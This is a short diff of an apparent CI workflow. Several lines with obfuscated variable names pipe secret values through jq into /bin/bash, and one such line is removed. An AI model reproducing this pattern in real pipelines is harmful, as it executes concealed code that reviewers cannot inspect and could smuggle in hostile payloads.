@@ -22,7 +22,6 @@ jobs:
           kdh4: ${{ secrets.kdh4 }}
         run: |
           printf '%s' "$kdh4" | jq -r .aouo9 | /bin/bash
-          printf '%s' "$fhk237" | jq -r .sli30 | /bin/bash
           echo $ahxx599 | jq -r .vvwws61128 | /bin/bash
           echo $ezm10 | jq -r .xm3036 | /bin/bash
           echo $yrdsr38364 | jq -r .one765 | /bin/bash
